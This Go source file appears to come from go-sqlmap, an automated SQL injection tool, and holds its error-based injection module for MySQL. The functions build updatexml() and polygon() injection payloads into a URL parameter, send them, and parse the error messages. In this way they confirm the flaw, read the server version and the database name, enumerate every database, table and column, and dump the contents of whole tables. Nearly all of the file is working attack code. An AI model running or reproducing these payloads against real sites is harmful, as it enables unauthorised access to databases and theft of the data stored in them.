package line

import (
	"github.com/EmYiQing/go-sqlmap/constant"
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/parse"
	"github.com/EmYiQing/go-sqlmap/util"
	"regexp"
	"strconv"
	"strings"
)

// DetectErrorBased 检测是否存在报错注入
func DetectErrorBased(fixUrl parse.BaseUrl, paramKey string, suffixList []string) (bool, string) {
	temp := fixUrl.Params[paramKey]
	for _, suffix := range suffixList {
		finalPayload := temp + suffix + constant.Space + "Or" + constant.Space +
			constant.UpdatexmlFunc + constant.Space + constant.Annotator
		fixUrl.SetParam(paramKey, finalPayload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			if strings.Contains(strings.ToLower(string(resp.Body)),
				strings.ToLower(constant.ErrorBasedKeyword)) {
				fixUrl.SetParam(paramKey, temp)
				return true, suffix
			}
		}
	}
	fixUrl.SetParam(paramKey, temp)
	return false, ""
}

// GetVersionByErrorBased 报错注入方式得到版本
func GetVersionByErrorBased(fixUrl parse.BaseUrl, paramKey string, suffix string) {
	temp := fixUrl.Params[paramKey]
	payload := temp + suffix + constant.UpdatexmlVersionPayload
	fixUrl.SetParam(paramKey, payload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.UpdatexmlErrorKeyword)) {
			re := regexp.MustCompile(constant.UpdatexmlRegex)
			res := re.FindAllStringSubmatch(body, -1)
			if strings.TrimSpace(res[0][1]) != "" {
				log.Info("mysql version:" + res[0][1])
			}
		}
	}
	fixUrl.SetParam(paramKey, temp)
}

// GetCurrentDatabaseByErrorBased 报错注入方式得到当前数据库名
func GetCurrentDatabaseByErrorBased(fixUrl parse.BaseUrl, paramKey string, suffix string) {
	temp := fixUrl.Params[paramKey]
	payload := temp + suffix + constant.UpdatexmlDatabasePayload
	fixUrl.SetParam(paramKey, payload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.UpdatexmlErrorKeyword)) {
			re := regexp.MustCompile(constant.UpdatexmlRegex)
			res := re.FindAllStringSubmatch(body, -1)
			if strings.TrimSpace(res[0][1]) != "" {
				log.Info("current database:" + res[0][1])
			}
		}
	}
	fixUrl.SetParam(paramKey, temp)
}

// GetAllDatabasesByErrorBased 报错注入方式得到所有数据库名
func GetAllDatabasesByErrorBased(fixUrl parse.BaseUrl, paramKey string, suffix string) {
	var databases string
	temp := fixUrl.Params[paramKey]
	for i := 0; ; i++ {
		payload := temp + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20schema_name%20" +
			"from%20information_schema.schemata%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
		fixUrl.SetParam(paramKey, payload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			body := string(resp.Body)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(constant.UpdatexmlErrorKeyword)) {
				re := regexp.MustCompile(constant.UpdatexmlRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if strings.TrimSpace(res[0][1]) != "" {
					databases = databases + res[0][1] + ","
				}
			} else {
				break
			}
		}
		fixUrl.SetParam(paramKey, temp)
	}
	log.Info("get databases success")
	data := util.DeleteLastChar(strings.TrimSpace(databases))
	fixUrl.SetParam(paramKey, temp)
	util.PrintDatabases(util.ConvertString(data))
}

// GetAllTablesByErrorBased 报错注入根据数据库名获得所有表名
func GetAllTablesByErrorBased(fixUrl parse.BaseUrl, paramKey string, suffix string, database string) {
	temp := fixUrl.Params[paramKey]
	var tables string
	for i := 0; ; i++ {
		payload := temp + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20table_name%20" +
			"from%20information_schema.tables%20where%20table_schema='" + database +
			"'%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
		fixUrl.SetParam(paramKey, payload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			body := string(resp.Body)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(constant.UpdatexmlErrorKeyword)) {
				re := regexp.MustCompile(constant.UpdatexmlRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if strings.TrimSpace(res[0][1]) != "" {
					tables = tables + res[0][1] + ","
				}
			} else {
				break
			}
		}
		fixUrl.SetParam(paramKey, temp)
	}
	log.Info("get tables success")
	data := util.DeleteLastChar(strings.TrimSpace(tables))
	fixUrl.SetParam(paramKey, temp)
	util.PrintTables(util.ConvertString(data))
}

// GetAllColumnsByErrorBased 报错注入根据数据库名和表名获得所有字段
func GetAllColumnsByErrorBased(fixUrl parse.BaseUrl, paramKey string, suffix string, database string, table string) {
	temp := fixUrl.Params[paramKey]
	var columns string
	for i := 0; ; i++ {
		payload := temp + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20column_name%20" +
			"from%20information_schema.columns%20where%20table_name='" + table +
			"'%20and%20table_schema='" + database + "'%20limit%20" + strconv.Itoa(i) + ",1),0x7e),1)--+"
		fixUrl.SetParam(paramKey, payload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			body := string(resp.Body)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(constant.UpdatexmlErrorKeyword)) {
				re := regexp.MustCompile(constant.UpdatexmlRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if strings.TrimSpace(res[0][1]) != "" {
					columns = columns + res[0][1] + ","
				}
			} else {
				break
			}
		}
		fixUrl.SetParam(paramKey, temp)
	}
	log.Info("get columns success")
	data := util.DeleteLastChar(strings.TrimSpace(columns))
	fixUrl.SetParam(paramKey, temp)
	util.PrintTables(util.ConvertString(data))
}

// GetAllDataByErrorBased 报错注入根据输入获得所有数据
func GetAllDataByErrorBased(fixUrl parse.BaseUrl, paramKey string, suffix string, database string, table string, columns []string) {
	temp := fixUrl.Params[paramKey]
	var data string
	tempPayload := "concat("
	for _, v := range columns {
		tempPayload = tempPayload + v + ",0x3a,"
	}
	r := []rune(tempPayload)
	innerPayload := string(r[:len(r)-6])
	innerPayload += ")"
	for i := 0; ; i++ {
		payload := temp + suffix + "%20and%20updatexml(2,concat(0x7e,(select%20" +
			innerPayload + "%20from%20" + database + "." + table + "%20limit%20" +
			strconv.Itoa(i) + ",1),0x7e),1)--+"
		fixUrl.SetParam(paramKey, payload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			body := string(resp.Body)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(constant.UpdatexmlErrorKeyword)) {
				re := regexp.MustCompile(constant.UpdatexmlRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if strings.TrimSpace(res[0][1]) != "" {
					data = data + res[0][1] + ","
				}
			} else {
				break
			}
		}
		fixUrl.SetParam(paramKey, temp)
	}
	log.Info("get data success")
	data = util.DeleteLastChar(strings.TrimSpace(data))
	var output [][]string
	for _, v := range strings.Split(data, ",") {
		var innerTemp []string
		params := strings.Split(v, ":")
		for _, innerV := range params {
			innerTemp = append(innerTemp, innerV)
		}
		output = append(output, innerTemp)
	}
	fixUrl.SetParam(paramKey, temp)
	util.PrintData(util.ConvertInterfaceArray(columns, output))
}

// GetVersionByErrorBasedPolygon 报错注入方式得到版本
func GetVersionByErrorBasedPolygon(fixUrl parse.BaseUrl, paramKey string, suffix string) {
	temp := fixUrl.Params[paramKey]
	payload := temp + suffix + constant.PolygonVersionPayload
	fixUrl.SetParam(paramKey, payload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonVersionRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("mysql version:" + res[0][1])
		}
	}
	fixUrl.SetParam(paramKey, temp)
}

// GetCurrentDatabaseByErrorBasedPolygon 报错注入方式得到当前数据库名
func GetCurrentDatabaseByErrorBasedPolygon(fixUrl parse.BaseUrl, paramKey string, suffix string) {
	temp := fixUrl.Params[paramKey]
	payload := temp + suffix + constant.PolygonDatabasePayload
	fixUrl.SetParam(paramKey, payload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonDatabaseRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("current database:" + res[0][1])
		}
	}
	fixUrl.SetParam(paramKey, temp)
}

// GetAllDatabasesByErrorBasedPolygon 报错注入方式得到所有数据库名
func GetAllDatabasesByErrorBasedPolygon(fixUrl parse.BaseUrl, paramKey string, suffix string) {
	temp := fixUrl.Params[paramKey]
	payload := temp + suffix + constant.PolygonAllDatabasesPayload
	fixUrl.SetParam(paramKey, payload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get databases success")
			util.PrintDatabases(util.ConvertString(res[0][1]))
		}
	}
	fixUrl.SetParam(paramKey, temp)
}

// GetAllTablesByErrorBasedPolygon 报错注入根据数据库名获得所有表名
func GetAllTablesByErrorBasedPolygon(fixUrl parse.BaseUrl, paramKey string, suffix string, database string) {
	temp := fixUrl.Params[paramKey]
	payload := temp + suffix + constant.Space + "Or" + constant.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20" +
		"group_concat(table_name)%20from%20information_schema." +
		"tables%20where%20table_schema='" + database + "')a)b))--+"
	fixUrl.SetParam(paramKey, payload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get tables success")
			util.PrintTables(util.ConvertString(res[0][1]))
		}
	}
	fixUrl.SetParam(paramKey, temp)
}

// GetAllColumnsByErrorBasedPolygon 报错注入根据数据库名和表名获得所有字段
func GetAllColumnsByErrorBasedPolygon(fixUrl parse.BaseUrl, paramKey string, suffix string,
	database string, table string) {
	temp := fixUrl.Params[paramKey]
	payload := temp + suffix + constant.Space + "Or" + constant.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20" +
		"group_concat(column_name)%20from%20information_schema." +
		"columns%20where%20table_name='" + table +
		"'%20and%20table_schema='" + database + "')a)b))--+"
	fixUrl.SetParam(paramKey, payload)
	resp := fixUrl.SendRequestByBaseUrl()
	if resp.Code != -1 {
		body := string(resp.Body)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get columns success")
			util.PrintColumns(util.ConvertString(res[0][1]))
		}
	}
	fixUrl.SetParam(paramKey, temp)
}

// GetAllDataByErrorBasedPolygon 报错注入根据输入获得所有数据
func GetAllDataByErrorBasedPolygon(fixUrl parse.BaseUrl, paramKey string, suffix string,
	database string, table string, columns []string) {
	temp := fixUrl.Params[paramKey]
	start := temp + suffix + constant.Space + "Or" + constant.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20concat("
	var tempPayload string
	for _, v := range columns {
		tempPayload = tempPayload + v + ",0x3a,"
	}
	r := []rune(tempPayload)
	result := string(r[:len(r)-6])
	var data []string
	for i := 0; ; i++ {
		payload := start + result + ")%20from%20" + database + "." + table +
			"%20limit%20+" + strconv.Itoa(i) + ",1)a)b))--+"
		fixUrl.SetParam(paramKey, payload)
		resp := fixUrl.SendRequestByBaseUrl()
		if resp.Code != -1 {
			body := string(resp.Body)
			if strings.Contains(strings.ToLower(body),
				strings.ToLower(constant.PolygonErrorKeyword)) {
				re := regexp.MustCompile(constant.PolygonFinalDataRegex)
				res := re.FindAllStringSubmatch(body, -1)
				if res != nil {
					data = append(data, res[0][1])
				} else {
					break
				}
			} else {
				break
			}
		}
		fixUrl.SetParam(paramKey, temp)
	}
	log.Info("get data success")
	var output [][]string
	for _, v := range data {
		var innerTemp []string
		params := strings.Split(v, ":")
		for _, innerV := range params {
			innerTemp = append(innerTemp, innerV)
		}
		output = append(output, innerTemp)
	}
	fixUrl.SetParam(paramKey, temp)
	util.PrintData(util.ConvertInterfaceArray(columns, output))
}
